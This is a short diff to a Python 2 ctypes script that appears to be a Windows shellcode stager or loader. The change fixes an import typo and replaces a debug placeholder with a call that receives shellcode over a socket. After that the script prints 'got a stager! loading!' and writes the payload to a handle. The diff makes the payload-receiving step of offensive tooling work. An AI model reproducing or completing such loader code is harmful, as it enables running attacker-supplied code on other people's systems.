@@ -1,5 +1,5 @@
 from ctypes import *
-from cytpes.wintypes import *
+from ctypes.wintypes import *
 from time import sleep
 import sys
 import os
@@ -88,7 +88,7 @@ def go(sock):
 	# Wait for shellcode
 	while(len(p) <= 0):
 		sleep(0.3)
-		p = #DEBUG, recieve data from the socket
+		p = recvData(sock)
 	print "got a stager! loading!"
 	sleep(2)
 	# Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
